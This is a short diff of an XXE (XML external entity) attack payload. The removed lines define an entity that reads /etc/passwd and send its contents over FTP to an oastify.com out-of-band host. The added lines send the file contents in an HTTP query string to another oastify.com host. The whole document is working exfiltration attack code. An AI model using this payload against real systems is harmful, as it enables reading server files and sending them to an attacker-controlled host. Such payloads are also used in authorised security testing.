@@ -1,2 +1,2 @@
-<!ENTITY $ file SYSTEM "file:///etc/passwd">
-<!ENTITY % req "<!ENTITY abc SYSTEM 'ftp://thexekiyps8mg3qlormnhl6lxc33ruoid.oastify.com/%file; '>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://n1prye2s9msg0xaf8l6h1fqfh6nxbobc0.oastify.com/?collect=%file;'>">
+%all;
